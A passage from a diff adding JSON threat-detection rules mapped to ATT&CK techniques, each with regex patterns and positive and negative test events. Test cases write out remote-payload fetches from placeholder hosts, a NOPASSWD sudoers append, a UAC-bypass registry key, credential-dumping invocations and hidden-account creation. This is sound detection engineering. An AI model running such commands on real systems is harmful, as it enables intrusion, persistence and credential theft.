+        "pattern": "(^|[\\\\/])(setfile)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "-a\\s+\\w*v"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "hidden"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\attrib.exe",
+      "command": "attrib +h +s C:\\Users\\Public\\x"
+     },
+     {
+      "executable": "/usr/bin/chflags",
+      "command": "chflags hidden /Users/a/.x"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\attrib.exe",
+      "command": "attrib -h x"
+     },
+     {
+      "executable": "/usr/bin/chflags",
+      "command": "chflags nohidden /Users/a/x"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-hidden-user-account",
+   "name": "Hidden user account created",
+   "description": "dscl IsHidden 1, SpecialAccounts\\UserList value 0 via reg add, or Hide500Users set: a login account hidden from the login screen.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.002",
+   "technique_name": "Hide Artifacts: Hidden Users",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(dscl\\s+\\.\\s+(create|-create)\\s+/users/\\S+\\s+ishidden\\s+1|specialaccounts\\\\userlist.*(/d\\s+0|-value\\s+0)|hide500users)"
+   },
+   "tags": [
+    "gap2",
+    "hidden-user"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . create /Users/svc IsHidden 1"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\reg.exe",
+      "command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList /v svc /t REG_DWORD /d 0 /f"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . read /Users/svc"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\reg.exe",
+      "command": "reg query HKLM\\SOFTWARE"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-headless-vm-launch",
+   "name": "Virtual machine started headless",
+   "description": "VBoxManage startvm --type headless, qemu with -nographic/-display none, or vmrun nogui; hidden VMs isolate malware from host tooling. Legitimate for servers and CI.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.006",
+   "technique_name": "Run Virtual Instance",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(vboxmanage|vboxheadless)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "startvm.*--type\\s+headless|^\\S*vboxheadless"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "qemu-system-\\S+$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "(-nographic|-display\\s+none)"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(vmrun)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "nogui"
+       }
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "vm"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/VBoxManage",
+      "command": "VBoxManage startvm lab --type headless"
+     },
+     {
+      "executable": "/usr/bin/qemu-system-x86_64",
+      "command": "qemu-system-x86_64 -m 2G -display none disk.img"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/VBoxManage",
+      "command": "VBoxManage list vms"
+     },
+     {
+      "executable": "/usr/bin/qemu-system-x86_64",
+      "command": "qemu-system-x86_64 -m 2G disk.img"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-ddns-provider-fetch",
+   "name": "Download from a dynamic-DNS hostname",
+   "description": "curl/wget/powershell fetching from duckdns, no-ip, ddns.net, hopto.org, zapto.org or serveo, whose records are cheap to rotate.",
+   "tactic": "Command and Control",
+   "technique": "T1568",
+   "technique_name": "Dynamic Resolution",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(curl|wget|powershell|pwsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "https?://[a-z0-9.-]+\\.(duckdns\\.org|no-ip\\.(com|org|biz)|ddns\\.net|hopto\\.org|zapto\\.org|serveo\\.net|myftp\\.biz|servehttp\\.com)\\b"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "dyndns"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl http://upd4te.duckdns.org/a.sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl https://duckduckgo.com"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl https://example.com/duckdns.org"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-hijackable-dll-unsigned-user-dir",
+   "name": "Unsigned commonly hijacked DLL loaded from a user-writable directory",
+   "description": "An unsigned version, winmm, dbghelp, cryptsp, wtsapi32, dwmapi, ntmarta or wlbsctrl DLL loads from AppData, Temp, ProgramData or Public, the search-order and sideloading pattern.",
+   "tactic": "Defense Evasion",
+   "technique": "T1574.002",
+   "technique_name": "Hijack Execution Flow: DLL Side-Loading",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "module",
+   "match": {
+    "all": [
+     {
+      "field": "module_path",
+      "op": "regex",
+      "pattern": "\\\\(appdata|temp|programdata|users\\\\public)\\\\.*\\\\(version|winmm|dbghelp|cryptsp|wtsapi32|dwmapi|ntmarta|wlbsctrl|d3d9|msimg32)\\.dll$"
+     },
+     {
+      "field": "signed",
+      "op": "in",
+      "patterns": [
+       "false"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "sideloading"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "module_path": "C:\\Users\\a\\AppData\\Roaming\\App\\version.dll",
+       "signed": "false",
+       "module_kind": "dll",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "module_path": "C:\\Users\\a\\AppData\\Roaming\\App\\version.dll",
+       "signed": "true",
+       "module_kind": "dll",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     },
+     {
+      "attrs": {
+       "module_path": "C:\\Windows\\System32\\version.dll",
+       "signed": "true",
+       "module_kind": "dll",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-phantom-dll-system32-create",
+   "name": "Known phantom DLL created in a system directory",
+   "description": "A file named wlbsctrl, ualapi, tsmsisrv, ikeext, cdpsgshims or diagtrack_win dll is created in System32/SysWOW64, planting a DLL a service looks for.",
+   "tactic": "Persistence",
+   "technique": "T1574.001",
+   "technique_name": "DLL Search Order Hijacking",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "file",
+   "match": {
+    "all": [
+     {
+      "field": "path",
+      "op": "regex",
+      "pattern": "\\\\windows\\\\(system32|syswow64)\\\\(wlbsctrl|ualapi|tsmsisrv|ikeext|cdpsgshims|diagtrack_win)\\.dll$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "phantom-dll"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "C:\\Windows\\System32\\wlbsctrl.dll",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "C:\\Windows\\System32\\drivers\\etc\\hosts",
+      "operation": "modify"
+     },
+     {
+      "path": "C:\\Users\\a\\Documents\\wlbsctrl.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-mac-dyld-injection-env",
+   "name": "DYLD library injection environment set",
+   "description": "DYLD_INSERT_LIBRARIES or DYLD_LIBRARY_PATH set to a /tmp, /Users/Shared, or user-writable path in a command line, dylib hijacking or injection.",
+   "tactic": "Defense Evasion",
+   "technique": "T1574.004",
+   "technique_name": "Dylib Hijacking",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "dyld_(insert_libraries|library_path|framework_path)=(/tmp|/private/tmp|/users/shared|/var/tmp|/users/[^/]+/(library|downloads|desktop))"
+   },
+   "tags": [
+    "gap2",
+    "dyld"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/zsh",
+      "command": "DYLD_INSERT_LIBRARIES=/tmp/inj.dylib /Applications/X.app/Contents/MacOS/X"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/zsh",
+      "command": "DYLD_LIBRARY_PATH=/opt/homebrew/lib ./app"
+     },
+     {
+      "executable": "/bin/zsh",
+      "command": "ls /tmp"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-dns-recon-zone-transfer",
+   "name": "DNS zone transfer or enumeration tool",
+   "description": "dig/host/nslookup requesting AXFR, or dnsrecon/dnsenum/fierce/amass/subfinder enumeration.",
+   "tactic": "Discovery",
+   "technique": "T1590.002",
+   "technique_name": "Gather Victim Network Information: DNS",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(dig|host|nslookup)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "(\\saxfr\\b|\\s-l\\s+\\S+|-type=(any|axfr)|\\sls\\s+-d)"
+       }
+      ]
+     },
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(dnsrecon|dnsenum|fierce|amass|subfinder)(\\.exe)?$"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "dns-recon"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/dig",
+      "command": "dig axfr corp.local @10.0.0.2"
+     },
+     {
+      "executable": "/usr/bin/dnsrecon",
+      "command": "dnsrecon -d corp.local"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/dig",
+      "command": "dig example.com A"
+     },
+     {
+      "executable": "/usr/bin/host",
+      "command": "host example.com"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-cloud-serverless-function-deploy",
+   "name": "Serverless function created or code replaced",
+   "description": "aws lambda create-function/update-function-code, az functionapp deployment, gcloud functions deploy from a shell. Routine for developers, so informational.",
+   "tactic": "Persistence",
+   "technique": "T1648",
+   "technique_name": "Serverless Execution",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(aws|az|gcloud)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(lambda\\s+(create-function|update-function-code)|functionapp\\s+(create|deployment)|functions\\s+deploy)"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "serverless"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/aws",
+      "command": "aws lambda update-function-code --function-name f --zip-file fileb://a.zip"
+     },
+     {
+      "executable": "/usr/bin/gcloud",
+      "command": "gcloud functions deploy f --runtime python311"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/aws",
+      "command": "aws lambda list-functions"
+     },
+     {
+      "executable": "/usr/bin/gcloud",
+      "command": "gcloud functions list"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-iis-module-install",
+   "name": "IIS native module or handler installed",
+   "description": "appcmd install module/add module with an image, or New-WebGlobalModule registers a native DLL in the web server, a web-server persistence route.",
+   "tactic": "Persistence",
+   "technique": "T1505.004",
+   "technique_name": "IIS Components",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(appcmd(\\.exe)?\\s+(install|add)\\s+module\\s+.*[/-]image:|new-webglobalmodule)"
+   },
+   "tags": [
+    "gap2",
+    "iis"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\inetsrv\\appcmd.exe",
+      "command": "appcmd.exe install module /name:evil /image:C:\\inetpub\\evil.dll"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell New-WebGlobalModule -Name x -Image C:\\x.dll"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\inetsrv\\appcmd.exe",
+      "command": "appcmd.exe list modules"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\inetsrv\\appcmd.exe",
+      "command": "appcmd.exe list sites"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-credential-dump-tools-parent",
+   "name": "Credential-dumping toolkit invoked by name",
+   "description": "secretsdump.py, pypykatz, nanodump, lsassy, mimipenguin or similar dumpers named on a command line.",
+   "tactic": "Credential Access",
+   "technique": "T1003",
+   "technique_name": "OS Credential Dumping",
+   "severity": "critical",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(^|[\\\\/\\s])(impacket-)?(secretsdump|pypykatz|nanodump|lsassy|mimipenguin|dumpert|handlekatz|safetykatz)(\\.py|\\.exe|\\.sh)?(\\s|$)"
+   },
+   "tags": [
+    "gap2",
+    "credential-dumping"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 secretsdump.py corp/admin@10.0.0.5"
+     },
+     {
+      "executable": "/usr/bin/bash",
+      "command": "bash mimipenguin.sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/python3",
+      "command": "python3 manage.py migrate"
+     },
+     {
+      "executable": "/usr/bin/vim",
+      "command": "vim notes.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-privilege-elevation-config-tamper",
+   "name": "Privilege-elevation configuration tampered with",
+   "description": "A NOPASSWD sudoers line appended, setcap granting cap_setuid/cap_sys_admin, or a UAC-bypass ms-settings/mscfile shell\\open\\command key written with reg add.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1548",
+   "technique_name": "Abuse Elevation Control Mechanism",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(nopasswd.*>>\\s*/etc/sudoers|echo\\s.*nopasswd.*(tee|>>)\\s.*sudoers|setcap\\s+\\S*cap_(setuid|sys_admin|dac_override)|reg(\\.exe)?\\s+add\\s+\\S*\\\\(ms-settings|mscfile)\\\\shell\\\\open\\\\command)"
+   },
+   "tags": [
+    "gap2",
+    "elevation"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c 'echo \"bob ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers'"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\reg.exe",
+      "command": "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d C:\\x.exe"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/setcap",
+      "command": "setcap cap_net_bind_service=+ep /usr/bin/node"
+     },
+     {
+      "executable": "/usr/bin/sudo",
+      "command": "sudo -l"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-proxy-execution-remote-fetch",
+   "name": "Signed binary used to fetch and run remote content",
+   "description": "msiexec /i with a URL, ieexec with a URL, syncappvpublishingserver or pubprn.vbs with a URL: signed-binary proxy execution from a remote source.",
+   "tactic": "Defense Evasion",
+   "technique": "T1218",
+   "technique_name": "System Binary Proxy Execution",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(msiexec)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "/i\\s+\\\"?https?://"
+       }
+      ]
+     },
+     {
+      "all": [
+       {
+        "field": "executable",
+        "op": "regex",
+        "pattern": "(^|[\\\\/])(ieexec)(\\.exe)?$"
+       },
+       {
+        "field": "command",
+        "op": "regex",
+        "pattern": "https?://"
+       }
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(syncappvpublishingserver(\\.exe|\\.vbs)?\\s+.*(n;|https?://)|pubprn(\\.vbs)?\\s+\\S+\\s+script:https?://)"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "lolbin"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\msiexec.exe",
+      "command": "msiexec /q /i http://203.0.113.5/a.msi"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\cscript.exe",
+      "command": "cscript pubprn.vbs 127.0.0.1 script:https://203.0.113.5/a.sct"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\msiexec.exe",
+      "command": "msiexec /i C:\\temp\\setup.msi /qn"
+     },
+     {
+      "executable": "C:\\Windows\\System32\\msiexec.exe",
+      "command": "msiexec /?"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-lin-systemd-run-timer",
+   "name": "systemd-run creates a transient timer",
+   "description": "systemd-run with a calendar or boot timer option schedules recurring execution without leaving a unit file on disk.",
+   "tactic": "Persistence",
+   "technique": "T1053.006",
+   "technique_name": "Scheduled Task/Job: Systemd Timers",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])systemd-run$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s--on-(calendar|boot|startup|unit-active|unit-inactive)[= ]"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "val2",
+    "systemd",
+    "timer"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/systemd-run",
+      "command": "systemd-run --user --on-calendar=*:0/5 /tmp/x"
+     },
+     {
+      "executable": "/usr/bin/systemd-run",
+      "command": "systemd-run --on-boot=30s /opt/a"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/systemd-run",
+      "command": "systemd-run --scope -p MemoryMax=1G make -j8"
+     },
+     {
+      "executable": "/usr/bin/systemd-run",
+      "command": "systemd-run --user --unit=job sleep 5"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-lin-shred-hidden-tmp-file",
+   "name": "shred or srm of a hidden file in a temp directory",
+   "description": "A secure-delete tool removes a dot-file from /tmp, /var/tmp or /dev/shm, the pattern of an implant erasing itself.",
+   "tactic": "Defense Evasion",
+   "technique": "T1070.004",
+   "technique_name": "Indicator Removal: File Deletion",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(shred|srm|wipe)$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-[a-z]*u[a-z]*\\s"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/tmp|/var/tmp|/dev/shm)/\\.[^/\\s]+"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "val2",
+    "delete",
+    "noisy-risk"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/shred",
+      "command": "shred -u -z /tmp/.implant"
+     },
+     {
+      "executable": "/usr/bin/srm",
+      "command": "srm -u /dev/shm/.k"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/shred",
+      "command": "shred -u /tmp/session.key"
+     },
+     {
+      "executable": "/usr/bin/shred",
+      "command": "shred -n 3 /home/a/notes.txt"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-any-legacy-ie-useragent-client",
+   "name": "Command-line HTTP client posing as an obsolete Internet Explorer",
+   "description": "curl or wget sets a MSIE 4 to 8 user agent, a long-lived habit of commodity beacons and droppers.",
+   "tactic": "Command and Control",
+   "technique": "T1071",
+   "technique_name": "Application Layer Protocol",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(curl|wget)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(\\s-A\\s|--user-agent[= ]|\\s-U\\s)[\\\"']?mozilla/[0-9.]+ \\(compatible; msie [4-8]\\.0"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "val2",
+    "c2",
+    "useragent"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s -A \"Mozilla/4.0 (compatible; MSIE 6.0)\" http://203.0.113.1/g"
+     },
+     {
+      "executable": "/usr/bin/wget",
+      "command": "wget --user-agent=\"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\" http://203.0.113.1/x"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s -A \"Mozilla/5.0 (X11; Linux x86_64)\" https://example.com"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s https://example.com"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-ps-webclient-header-raw-ip",
+   "name": "PowerShell WebClient with a custom Cookie or Authorization header to a raw IP",
+   "description": "A WebClient sets a Cookie or Authorization header and then fetches from a bare IP address, the shape of a scripted HTTP beacon.",
+   "tactic": "Command and Control",
+   "technique": "T1071.001",
+   "technique_name": "Application Layer Protocol: Web Protocols",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])(powershell|pwsh)(\\.exe)?$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "headers\\.add\\(\\s*['\\\"](cookie|authorization)['\\\"]"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "https?://\\d{1,3}(\\.\\d{1,3}){3}[:/]"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "val2",
+    "c2",
+    "http"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -c \"$w=New-Object Net.WebClient;$w.Headers.Add('Cookie','a=b');$w.DownloadString('http://203.0.113.9/b')\""
+     }
+    ],
+    "negative": [
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -c \"$w=New-Object Net.WebClient;$w.Headers.Add('Authorization','Bearer x');$w.DownloadString('https://api.contoso.com/v1')\""
+     },
+     {
+      "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "command": "powershell -c Get-Date"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-lin-ssh-mux-socket-from-tmp",
+   "name": "ssh reuses a control socket stored in a temp directory",
+   "description": "ssh -S points at a multiplex control socket under /tmp, /var/tmp or /dev/shm, the way an attacker rides another user's authenticated session.",
+   "tactic": "Lateral Movement",
+   "technique": "T1563.001",
+   "technique_name": "Remote Service Session Hijacking: SSH Hijacking",
+   "severity": "low",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "regex",
+      "pattern": "(^|[\\\\/])ssh$"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s-S\\s+(/tmp|/var/tmp|/dev/shm)/\\S+"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "val2",
+    "ssh",
+    "hijack"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -S /tmp/ssh-mux-admin@10.0.0.8:22 -O forward admin@10.0.0.8"
+     },
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -S /dev/shm/cm-1 host"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh admin@10.0.0.8"
+     },
+     {
+      "executable": "/usr/bin/ssh",
+      "command": "ssh -S ~/.ssh/cm-x host -O exit"
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-specialaccounts-userlist-set",
+   "name": "Winlogon SpecialAccounts UserList value written",
+   "description": "A value under Winlogon\\SpecialAccounts\\UserList hides that account from the logon screen.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.002",
+   "technique_name": "Hide Artifacts: Hidden Users",
+   "severity": "high",
+   "os": "windows",
+   "event_type": "registry",
+   "match": {
+    "all": [
+     {
+      "field": "key",
+      "op": "regex",
+      "pattern": "\\\\winlogon\\\\specialaccounts\\\\userlist$"
+     },
+     {
+      "field": "operation",
+      "op": "in",
+      "patterns": [
+       "set",
+       "create"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "val2",
+    "registry",
+    "hidden-user"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList",
+       "value_name": "svc",
+       "value_data": "0",
+       "operation": "set"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "key": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
+       "value_name": "Shell",
+       "value_data": "explorer.exe",
+       "operation": "set"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-win-unsigned-system-named-dll-outside-system",
+   "name": "Unsigned DLL carrying a hijack-prone system name loaded from an application folder",
+   "description": "An unsigned module named like a Windows system DLL (version, winmm, cryptsp, dwmapi and similar) loads from outside the Windows directories, the classic search-order hijack.",
+   "tactic": "Persistence",
+   "technique": "T1574.001",
+   "technique_name": "Hijack Execution Flow: DLL Search Order Hijacking",
+   "severity": "medium",
+   "os": "windows",
+   "event_type": "module",
+   "match": {
+    "all": [
+     {
+      "field": "module_path",
+      "op": "regex",
+      "pattern": "\\\\(version|winmm|cryptsp|dwmapi|wtsapi32|uxtheme|msimg32|dbghelp|secur32|userenv|winhttp)\\.dll$"
+     },
+     {
+      "not": {
+       "field": "module_path",
+       "op": "regex",
+       "pattern": "^[a-z]:\\\\windows\\\\"
+      }
+     },
+     {
+      "field": "signed",
+      "op": "regex",
+      "pattern": "^false$"
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "val2",
+    "module",
+    "dll-hijack"
+   ],
+   "batch": "gap2-v1",
+   "tests": {
+    "positive": [
+     {
+      "attrs": {
+       "module_path": "C:\\Program Files\\VendorApp\\version.dll",
+       "signed": "false",
+       "module_kind": "dll",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     }
+    ],
+    "negative": [
+     {
+      "attrs": {
+       "module_path": "C:\\Windows\\System32\\version.dll",
+       "signed": "false",
+       "module_kind": "dll",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     },
+     {
+      "attrs": {
+       "module_path": "C:\\Program Files\\VendorApp\\version.dll",
+       "signed": "true",
+       "module_kind": "dll",
+       "hash": "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
+      }
+     }
+    ]
+   }
+  },
+  {
+   "id": "gp2-unix-unsigned-module-from-temp",
+   "name": "Unsigned shared object or dylib loaded from a world-writable directory",
+   "description": "An unsigned library loads from /tmp, /var/tmp, /dev/shm or /Users/Shared, a dylib or shared-object hijack staging area.",
+   "tactic": "Persistence",
+   "technique": "T1574.004",
+   "technique_name": "Hijack Execution Flow: Dylib Hijacking",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "module",
+   "match": {
+    "all": [
+     {
+      "field": "module_path",
+      "op": "regex",
+      "pattern": "^(/tmp|/private/tmp|/var/tmp|/dev/shm|/users/shared)/"
+     },
+     {
+      "field": "signed",
+      "op": "regex",
+      "pattern": "^false$"
+     },
+     {
+      "field": "module_kind",
+      "op": "in",
+      "patterns": [
+       "so"
+      ]
+     }
+    ]
+   },
+   "tags": [
+    "gap2",
+    "val2",
+    "module",
+    "dylib"
+   ],
+   "batch": "gap2-v1",
